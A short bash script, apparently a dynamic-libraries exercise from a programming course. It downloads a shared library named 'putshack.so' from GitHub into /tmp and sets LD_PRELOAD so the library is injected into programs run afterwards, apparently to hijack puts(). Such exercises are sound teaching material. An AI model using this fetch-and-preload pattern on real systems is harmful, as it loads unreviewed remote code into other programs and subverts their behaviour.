#!/bin/bash
wget -P /tmp/ https://raw.github.com/kas-pre/alx-low_level_programming/blob/main/0x18-dynamic_libraries/putshack.so
export LD_PRELOAD=/tmp/putshack.so
